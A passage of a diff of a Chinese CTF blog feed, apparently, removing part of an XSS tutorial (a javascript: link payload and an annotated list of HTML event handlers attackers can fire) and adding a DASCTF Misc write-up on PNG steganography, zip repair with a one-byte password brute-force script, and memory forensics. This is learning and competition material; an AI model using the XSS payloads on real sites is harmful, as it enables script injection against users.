-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;Hello, this is a JavaScript execution!&#x27;);&quot;</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p><strong>通过Cookie注入：</strong> 如果网站使用未经过滤的Cookie数据，攻击者可能通过修改Cookie中的值来注入恶意脚本。</p>
-</li>
-<li>
-<p><strong>社会工程学攻击：</strong> 攻击者可能通过欺骗用户点击包含恶意脚本的链接，从而触发XSS攻击。</p>
-</li>
-</ol>
-<h3 id="XSS靶场题解：">XSS靶场题解：</h3>
-<p><a class="link"   href="https://zch050217.github.io/2024/02/04/XSS%E9%9D%B6%E5%9C%BA/" >XSS靶场题解 | C3ngH’s B10g<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="附加知识">附加知识</h3>
-<ul>
-<li>
-<h4 id="触发事件函数">触发事件函数</h4>
-</li>
-</ul>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件) </span><br><span class="line"></span><br><span class="line">2. onAbort() (当用户中止加载图片时) </span><br><span class="line"></span><br><span class="line">3. onActivate() (当对象激活时) </span><br><span class="line"></span><br><span class="line">4. onAfterPrint() (用户打印或进行打印预览后触发) </span><br><span class="line"></span><br><span class="line">5. onAfterUpdate() (从数据源对象更新数据后由数据对象触发) </span><br><span class="line"></span><br><span class="line">6. onBeforeActivate() (在对象设置为激活元素前触发) </span><br><span class="line"></span><br><span class="line">7. onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(&quot;Copy&quot;)函数触发) </span><br><span class="line"></span><br><span class="line">8. onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码) </span><br><span class="line"></span><br><span class="line">9. onBeforeDeactivate() (在当前对象的激活元素变化前触发) </span><br><span class="line"></span><br><span class="line">10. onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发) </span><br><span class="line"></span><br><span class="line">11. onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(&quot;Paste&quot;)函数触发) </span><br><span class="line"></span><br><span class="line">12. onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)函数). </span><br><span class="line"></span><br><span class="line">13. onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口) </span><br><span class="line"></span><br><span class="line">14. onBeforeUpdate() (从数据源对象更新数据前由数据对象触发) </span><br><span class="line"></span><br><span class="line">15. onBegin() (当元素周期开始时由onbegin 事件立即触发) </span><br><span class="line"></span><br><span class="line">16. onBlur() (另一个窗口弹出当前窗口失去焦点时触发) </span><br><span class="line"></span><br><span class="line">17. onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发) </span><br><span class="line"></span><br><span class="line">18. onCellChange() (当数据提供者的数据变化时触发) </span><br><span class="line"></span><br><span class="line">19. onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发) </span><br><span class="line"></span><br><span class="line">20. onClick() (表单中点击触发) </span><br><span class="line"></span><br><span class="line">21. onContextMenu() (用户需要在攻击区域点击右键) </span><br><span class="line"></span><br><span class="line">22. onControlSelect() (当用户在一个对象上创建控件选中区时触发) </span><br><span class="line"></span><br><span class="line">23. onCopy() (用户需要复制一些东西或使用execCommand(&quot;Copy&quot;)命令时触发) </span><br><span class="line"></span><br><span class="line">24. onCut() (用户需要剪切一些东西或使用execCommand(&quot;Cut&quot;)命令时触发) </span><br><span class="line"></span><br><span class="line">25. onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能) </span><br><span class="line"></span><br><span class="line">26. onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发) </span><br><span class="line"></span><br><span class="line">27. onDataSetComplete() (数据源对象中所有数据可用时触发) </span><br><span class="line"></span><br><span class="line">28. onDblClick() (用户双击一个表单元素或链接) </span><br><span class="line"></span><br><span class="line">29. onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发) </span><br><span class="line"></span><br><span class="line">30. onDrag() (在元素正在拖动时触发) </span><br><span class="line"></span><br><span class="line">31. onDragEnd() (当用户完成元素的拖动时触发) </span><br><span class="line"></span><br><span class="line">32. onDragLeave() (用户在拖动元素离开放置目标时触发) </span><br><span class="line"></span><br><span class="line">33. onDragEnter() (用户将对象拖拽到合法拖曳目标) </span><br><span class="line"></span><br><span class="line">34. onDragOver() (用户将对象拖拽划过合法拖曳目标) </span><br><span class="line"></span><br><span class="line">35. onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口) </span><br><span class="line"></span><br><span class="line">36. onDragStart() (当用户开始拖动元素时触发) </span><br><span class="line"></span><br><span class="line">37. onDrop() (当拖动元素放置在目标区域时触发) </span><br><span class="line"></span><br><span class="line">38. onEnded() (在视频/音频（audio/video）播放结束时触发) </span><br><span class="line"></span><br><span class="line">39. onError() (在加载文档或图像时发生错误) </span><br><span class="line"></span><br><span class="line">40. onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发) </span><br><span class="line"></span><br><span class="line">41. onFilterChange() (当滤镜完成状态变更时触发) </span><br><span class="line"></span><br><span class="line">42. onFinish() (当marquee完成滚动时攻击者可以执行攻击) </span><br><span class="line"></span><br><span class="line">43. onFocus() (当窗口获得焦点时攻击者可以执行攻击代码) </span><br><span class="line"></span><br><span class="line">44. onFocusIn() (当元素将要被设置为焦点之前触发) </span><br><span class="line"></span><br><span class="line">45. onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码) </span><br><span class="line"></span><br><span class="line">46. onHashChange() (当锚部分发生变化时触发攻击代码) </span><br><span class="line"></span><br><span class="line">47. onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码) </span><br><span class="line"></span><br><span class="line">48. onInput() (在 &lt;input&gt; 或 &lt;textarea&gt; 元素的值发生改变时触发) </span><br><span class="line"></span><br><span class="line">49. onKeyDown() (用户按下一个键的时候触发) </span><br><span class="line"></span><br><span class="line">50. onKeyPress() (在键盘按键被按下并释放一个键时触发) </span><br><span class="line"></span><br><span class="line">51. onKeyUp() (用户释放一个键时触发) </span><br><span class="line"></span><br><span class="line">52. onLayoutComplete() (用户进行完打印或打印预览时触发) </span><br><span class="line"></span><br><span class="line">53. onLoad() (攻击者在窗口加载后触发攻击代码) </span><br><span class="line"></span><br><span class="line">54. onLoseCapture() (可以由releaseCapture()方法触发) </span><br><span class="line"></span><br><span class="line">55. onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发) </span><br><span class="line"></span><br><span class="line">56. onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件) </span><br><span class="line"></span><br><span class="line">57. onMessage() (当页面收到一个信息时触发事件) </span><br><span class="line"></span><br><span class="line">58. onMouseDown() (攻击者需要让用户点击一个图片触发事件) </span><br><span class="line"></span><br><span class="line">59. onMouseEnter() (光标移动到一个对象或区域时触发) </span><br><span class="line"></span><br><span class="line">60. onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件) </span><br><span class="line"></span><br><span class="line">61. onMouseMove() (攻击者需要让用户将光标移到一个图片或表格) </span><br><span class="line"></span><br><span class="line">62. onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件) </span><br><span class="line"></span><br><span class="line">63. onMouseOver() (光标移动到一个对象或区域) </span><br><span class="line"></span><br><span class="line">64. onMouseUp() (攻击者需要让用户点击一个图片) </span><br><span class="line"></span><br><span class="line">65. onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮) </span><br><span class="line"></span><br><span class="line">66. onMove() (用户或攻击者移动页面时触发) </span><br><span class="line"></span><br><span class="line">67. onMoveEnd() (用户或攻击者移动页面结束时触发) </span><br><span class="line"></span><br><span class="line">68. onMoveStart() (用户或攻击者开始移动页面时触发) </span><br><span class="line"></span><br><span class="line">69. onOffline() (当浏览器从在线模式切换到离线模式时触发) </span><br><span class="line"></span><br><span class="line">70. onOnline() (当浏览器从离线模式切换到在线模式时触发) </span><br><span class="line"></span><br><span class="line">71. onOutOfSync() (当元素与当前时间线失去同步时触发) </span><br><span class="line"></span><br><span class="line">72. onPaste() (用户进行粘贴时或攻击者可以使用execCommand(&quot;Paste&quot;)函数时触发) </span><br><span class="line"></span><br><span class="line">73. onPause() (在视频或音频暂停时触发) </span><br><span class="line"></span><br><span class="line">74. onPopState() (在窗口的浏览历史（history 对象）发生改变时触发) </span><br><span class="line"></span><br><span class="line">75. onProgress() (攻击者可以在一个FLASH加载时触发事件) </span><br><span class="line"></span><br><span class="line">76. onPropertyChange() (用户或攻击者需要改变元素属性时触发) </span><br><span class="line"></span><br><span class="line">77. onReadyStateChange() (每次 readyState 属性变化时被自动调用) </span><br><span class="line"></span><br><span class="line">78. onRedo() (用户返回上一页面时触发) </span><br><span class="line"></span><br><span class="line">79. onRepeat() (事件在播放完重复播放时触发) </span><br><span class="line"></span><br><span class="line">80. onReset() (用户或攻击者重置表单时触发) </span><br><span class="line"></span><br><span class="line">81. onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;) </span><br><span class="line"></span><br><span class="line">82. onResizeEnd() (用户完成改变窗体大小时触发) </span><br><span class="line"></span><br><span class="line">83. onResizeStart() (用户开始改变窗体大小时触发) </span><br><span class="line"></span><br><span class="line">84. onResume() (当元素继续播放时触发) </span><br><span class="line"></span><br><span class="line">85. onReverse() (当元素回放时触发) </span><br><span class="line"></span><br><span class="line">86. onRowsEnter() (用户或攻击者需要改变数据源中的一行) </span><br><span class="line"></span><br><span class="line">87. onRowExit() (用户或攻击者改变数据源中的一行后退出时触发) </span><br><span class="line"></span><br><span class="line">88. onRowDelete() (用户或攻击者需要删除数据源中的一行) </span><br><span class="line"></span><br><span class="line">89. onRowInserted() (user or attacker would needto insert a row in a data source) </span><br><span class="line"></span><br><span class="line">90. onScroll() (用户需要滚动或攻击者使用scrollBy()函数) </span><br><span class="line"></span><br><span class="line">91. onSeek() (当用户在元素上执行查找操作时触发) </span><br><span class="line"></span><br><span class="line">92. onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);) </span><br><span class="line"></span><br><span class="line">93. onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);) </span><br><span class="line"></span><br><span class="line">94. onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);) </span><br><span class="line"></span><br><span class="line">95. onStart() (在marquee 对象开始循环时触发) </span><br><span class="line"></span><br><span class="line">96. onStop() (当用户按下停止按钮或离开页面时触发) </span><br><span class="line"></span><br><span class="line">97. onStorage() (当Web Storage更新时触发) </span><br><span class="line"></span><br><span class="line">98. onSyncRestored() (当元素与它的时间线恢复同步时触发) </span><br><span class="line"></span><br><span class="line">99. onSubmit() (需要用户或攻击者提交表单) </span><br><span class="line"></span><br><span class="line">100.onTimeError() (用户或攻击者设置时间属性出现错误时触发) </span><br><span class="line"></span><br><span class="line">101.onTrackChange() (用户或攻击者改变播放列表内歌曲时触发) </span><br><span class="line"></span><br><span class="line">102.onUndo() (用户返回上一浏览记录页面时触发) </span><br><span class="line"></span><br><span class="line">103.onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发) </span><br><span class="line"></span><br><span class="line">104.onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本) </span><br><span class="line"></span><br><span class="line">105.seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)</span><br></pre></td></tr></table></figure>
+<p>flag第一段藏在png文件末尾，base64解码后获得<code>DASCTF&#123;2fd9e9ff-e27</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-24-09.png"
+                        alt="Clip_2024-07-23_14-24-09"
+                 ></p>
+<p>binwalk和zsteg都会提示png后有额外块，也可以使用<code>pngcheck -v</code>检查每个IDAT块是否有错误</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-34-41.png"
+                        alt="Clip_2024-07-23_14-34-41"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-35-03.png"
+                        alt="Clip_2024-07-23_14-35-03"
+                 ></p>
+<p>在010中把有问题的IDAT块复制，找一张png图片，取其文件头尾，将IDAT块复制出，作为一张新的图片，但因为宽高不知，用Puzzle Solver进行宽高爆破，得到宽高是500*500，获得flag   <code>a19131f86216&#125;</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/500X500_2_3_8.png"
+                        alt="500X500_2_3_8"
+                 ></p>
+<p>StegSlove中可以看到Alpha通道有东西</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-25-34.png"
+                        alt="Clip_2024-07-23_15-25-34"
+                 ></p>
+<p>尝试后可以找到中间段flag  <code>d-5405-c5f5-</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-26-38.png"
+                        alt="Clip_2024-07-23_15-26-38"
+                 ></p>
+<h3 id="EZ-zip">EZ_zip</h3>
+<p><a class="link"   href="https://hello-ctf.com/HC_MISC/Archivefile/#zip" >压缩包文件结构<i class="fas fa-external-link-alt"></i></a></p>
+<p>直接解压会报错，010打开模板报错，发现解压文件长度不对，可以看到<code>320.zip</code>长度应该为7（文件长度要加后缀长度），修改为7，要将文件头和目录区长度都修改</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-47-29.png"
+                        alt="Clip_2024-07-23_15-47-29"
+                 ></p>
+<p>解压后提示CRC校验错误，参照着DirEntry改动record段，可以发现是解压方法被改成了store，跟压缩方法对不上，修改解压方式</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-58-20.png"
+                        alt="Clip_2024-07-23_15-58-20"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-23.png"
+                        alt="Clip_2024-07-23_16-00-23"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-36.png"
+                        alt="Clip_2024-07-23_16-00-36"
+                 ></p>
+<p>修改后可以正常进行解压得到<code>320.zip</code>，查看压缩文件注释可以得到密码的提示<code>just a byte</code>，密码为一个字节，可以使用python进行爆破。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>解压得到一个txt，提示加密方法为AES-ECB，并提示key可能在前面的过程中就出现了</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-03-17.png"
+                        alt="Clip_2024-07-23_16-03-17"
+                 ></p>
+<p>联想到前面解压密码是字节形式，通过打印解压密码发现</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            key += password</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(key[::-<span class="number">1</span>].<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
+<p><code>c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11</code></p>
+<p>是循环的一个64位字符，将其当作key解密AES得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-04-42.png"
+                        alt="Clip_2024-07-23_16-04-42"
+                 ></p>
+<h3 id="ServerMeM">ServerMeM</h3>
+<p>题面信息如下</p>
+<blockquote>
+<p>公司的服务器遭受了黑客的攻击，经过勘察黑客为维持权限留下了后门，我们获取到了服务器的内存文件，请你分析黑客留下的痕迹</p>
+</blockquote>
+<p>下载附件并解压得到：out.lime、System.map</p>
+<p>在WSL中用以下命令搜索一下得到Linux内核的版本号，因此很明显就是Linux内存取证了</p>
+<blockquote>
+<p>strings mem | grep -i ‘Linux version’ | uniq</p>
+</blockquote>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923181948954.png"
+                        alt="image-20240923181948954"
+                 ></p>
+<p>本题提供两种解法，第一种是常规的通过制作Linux的符号文件来进行取证，另一种就是直接分析内存中的可疑文件</p>
+<h4 id="解法一">解法一</h4>
+<p>Linux内核版本信息如下：</p>
+<blockquote>
+<p>Linux version 5.4.27 (root@localhost.localdomain) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC)) #1 SMP Sun May 26 03:37:06 EDT 2024</p>
+</blockquote>
+<h4 id="解法二">解法二</h4>
+<p>直接在strings的结果中搜索 ”.tar.gz” 后缀的文件，发现有一个S3rCr3t.tar.gz</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182121568.png"
+                        alt="image-20240923182121568"
+                 ></p>
+<p>知道了文件名后直接在010中搜索，得到了openssl AES加密后的密文（以Salted开头）</p>
+<p>还有openssl的具体版本：1.0.2k</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182211807.png"
+                        alt="image-20240923182211807"
+                 ></p>
+<p>用CyberChef提取，注意后面的注释不要一起提取出来</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/11111111.png"
+                        alt="11111111"
+                 ></p>
+<p>继续往下查看，可以找到 openssl 加密的密钥：P@ssW0rdddd</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182320920.png"
+                        alt="image-20240923182320920"
+                 ></p>
+<p>然后只要安装openssl-1.0.2-k，使用得到的密钥解密即可</p>
+<p>具体安装步骤如下，编译完成后openssl可执行文件在apps目录下</p>
+<blockquote>
+<p>wget <a class="link"   href="https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz" >https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz<i class="fas fa-external-link-alt"></i></a></p>
+<p>tar -xzvf openssl-1.0.2k.tar.gz</p>
+<p>cd openssl-1.0.2k.tar.gz</p>
+<p>./config --prefix=/usr/</p>
+<p>make</p>
+</blockquote>
+<p>使用以下命令解密即可得到flag：DASCTF{c086cd55-b86a-4ee6-8933-c8bee578148a}</p>
+<blockquote>
+<p>./openssl-1.0.2k/apps/openssl enc -d -aes256 -in download.bin -out flag.tar.gz -k P@ssW0rdddd</p>
+</blockquote>
+<h3 id="ez-wav">ez_wav</h3>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240711.png"
+                        alt="das240711"
+                 ></p>
+<p>打开key.grc</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240712.png"
+                        alt="das240712"
+                 ></p>
+<p>可知key文件经过如上流程变成look.txt文件。我们需要根据这个流程逆回key文件</p>
+<blockquote>
+<p>信号源——》xor-&gt;数据类型转换-&gt;相乘一个常数-&gt;写入</p>
+<p>下面的Vector Source提供的一个脉冲信号</p>
+</blockquote>
+<p>exp如下</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/04e83e72-8324-40b3-8d14-0cf50565178e.png"
+                        alt="04e83e72-8324-40b3-8d14-0cf50565178e"
+                 ></p>
+<p>010打开后得到密码 good_job</p>
+<p>打开flag.grc</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/2fba9b78-9356-4852-aa1a-8aadee4dee85.png"
+                        alt="2fba9b78-9356-4852-aa1a-8aadee4dee85"
+                 ></p>
+<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/8209f61b-1618-48de-8084-75189f5b1fa8.png"
+                        alt="8209f61b-1618-48de-8084-75189f5b1fa8"
+                 ></p>
+<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4bda376f-8a5f-450b-88b4-357a057b85e2.png"
+                        alt="4bda376f-8a5f-450b-88b4-357a057b85e2"
+                 ></p>
+<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/893acd65-17e9-48ab-9221-b84a454b27c0.png"
+                        alt="893acd65-17e9-48ab-9221-b84a454b27c0"
+                 ></p>
+<p>听flag即可</p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>Web</tag>
+        <tag>Misc</tag>
       </tags>
   </entry>
   <entry>
@@ -760,235 +989,6 @@
       </categories>
       <tags>
         <tag>ACM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DASCTF 2024暑期挑战赛 Misc部分WP</title>
-    <url>//post/DASCTF2407/</url>
-    <content><![CDATA[<h3 id="png-master">png_master</h3>
-<p><a class="link"   href="https://zh.wikipedia.org/wiki/PNG" >PNG文件结构-维基百科<i class="fas fa-external-link-alt"></i></a></p>
-<ul>
-<li><code>IDAT</code>块是储存图像数据的块，在这个块中存放在图像真正的数据信息，IDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块</li>
-<li>完整的图像数据由一个单独的<code>zlib datastream</code>表示，它储存在一个<code>IDAT</code>块中</li>
-<li>一个png文件中无论有多少个<code>IDAT</code>区块，在<code>IDAT</code>块中只会出现一个<code>zlib</code>块</li>
-<li><code>789C</code>在png文件中为<code>zlib</code>的标志位</li>
-<li>一个<code>zlib</code>数据块只有一个标志位，即只会出现一次<code>789C</code></li>
-</ul>
-<p>flag第一段藏在png文件末尾，base64解码后获得<code>DASCTF&#123;2fd9e9ff-e27</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-24-09.png"
-                        alt="Clip_2024-07-23_14-24-09"
-                 ></p>
-<p>binwalk和zsteg都会提示png后有额外块，也可以使用<code>pngcheck -v</code>检查每个IDAT块是否有错误</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-34-41.png"
-                        alt="Clip_2024-07-23_14-34-41"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-35-03.png"
-                        alt="Clip_2024-07-23_14-35-03"
-                 ></p>
-<p>在010中把有问题的IDAT块复制，找一张png图片，取其文件头尾，将IDAT块复制出，作为一张新的图片，但因为宽高不知，用Puzzle Solver进行宽高爆破，得到宽高是500*500，获得flag   <code>a19131f86216&#125;</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/500X500_2_3_8.png"
-                        alt="500X500_2_3_8"
-                 ></p>
-<p>StegSlove中可以看到Alpha通道有东西</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-25-34.png"
-                        alt="Clip_2024-07-23_15-25-34"
-                 ></p>
-<p>尝试后可以找到中间段flag  <code>d-5405-c5f5-</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-26-38.png"
-                        alt="Clip_2024-07-23_15-26-38"
-                 ></p>
-<h3 id="EZ-zip">EZ_zip</h3>
-<p><a class="link"   href="https://hello-ctf.com/HC_MISC/Archivefile/#zip" >压缩包文件结构<i class="fas fa-external-link-alt"></i></a></p>
-<p>直接解压会报错，010打开模板报错，发现解压文件长度不对，可以看到<code>320.zip</code>长度应该为7（文件长度要加后缀长度），修改为7，要将文件头和目录区长度都修改</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-47-29.png"
-                        alt="Clip_2024-07-23_15-47-29"
-                 ></p>
-<p>解压后提示CRC校验错误，参照着DirEntry改动record段，可以发现是解压方法被改成了store，跟压缩方法对不上，修改解压方式</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-58-20.png"
-                        alt="Clip_2024-07-23_15-58-20"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
